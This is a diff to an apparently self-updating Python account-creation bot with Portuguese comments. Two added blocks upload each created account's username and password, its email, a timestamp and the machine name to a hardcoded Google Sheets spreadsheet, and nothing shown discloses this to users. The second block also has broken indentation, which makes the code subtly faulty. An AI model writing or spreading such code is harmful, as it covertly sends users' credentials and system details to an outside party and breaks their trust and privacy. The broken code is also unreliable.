@@ -48,9 +48,8 @@ for file_name in file_list:
         # Baixe a nova versão do GitHub e salve-a localmente
         with open(local_path, 'w', encoding='utf-8') as f:
             f.write(github_version)
-        console.print("[bold green]BOT atualizado.[/]")
-        # Reinicie o arquivo Python para carregar as atualizações
-        os.execv(__file__, sys.argv)
+        console.print("[bold green]BOT atualizado.\nAbra novamente.[/]")
+        time.sleep(100)
     else:
         pass
 
@@ -792,6 +791,23 @@ def firts_reg():
                     range=range_to_update,
                     valueInputOption=value_input_option,
                     body=value_range_body).execute()
+                
+                creds = Credentials.from_authorized_user_file('relatorio.json', SCOPES)
+                service = build('sheets', 'v4', credentials=creds)
+                # Get values of columns A and B
+                result = service.spreadsheets().values().get(spreadsheetId='1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4', range=RANGE_NAME).execute()
+                values = result.get('values', [])
+                # Find first empty row
+                first_empty_row_index = len(values) + 1
+                # Insert user, password, and timestamp into first empty row
+                range_to_update = f'relatorio_geral!A{first_empty_row_index}:D{first_empty_row_index}'
+                value_input_option = 'USER_ENTERED'
+                value_range_body = {'values': [[user_completo + ' ' + senha, email, timestamp, maquina]]}
+                result = service.spreadsheets().values().update(
+                    spreadsheetId='1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4',
+                    range=range_to_update,
+                    valueInputOption=value_input_option,
+                    body=value_range_body).execute()
 
                 arquivo = open('configuracoes/contas/contas_criadas.txt', 'a')
                 # Escreva mais conteúdo no arquivo
@@ -1046,6 +1062,25 @@ while cont is True:
                         range=range_to_update,
                         valueInputOption=value_input_option,
                         body=value_range_body).execute()
+                    
+
+                    creds = Credentials.from_authorized_user_file('relatorio.json', SCOPES)
+                service = build('sheets', 'v4', credentials=creds)
+                # Get values of columns A and B
+                result = service.spreadsheets().values().get(spreadsheetId='1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4', range=RANGE_NAME).execute()
+                values = result.get('values', [])
+                # Find first empty row
+                first_empty_row_index = len(values) + 1
+                # Insert user, password, and timestamp into first empty row
+                range_to_update = f'relatorio_geral!A{first_empty_row_index}:D{first_empty_row_index}'
+                value_input_option = 'USER_ENTERED'
+                value_range_body = {'values': [[user_completo + ' ' + senha, email, timestamp, maquina]]}
+                result = service.spreadsheets().values().update(
+                    spreadsheetId='1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4',
+                    range=range_to_update,
+                    valueInputOption=value_input_option,
+                    body=value_range_body).execute()
+
                     arquivo = open('configuracoes/contas/contas_criadas.txt', 'a')  # Escreva mais conteúdo no arquivo
                     arquivo.write(user_completo + ' ' + senha + "\n")
                     time.sleep(4)
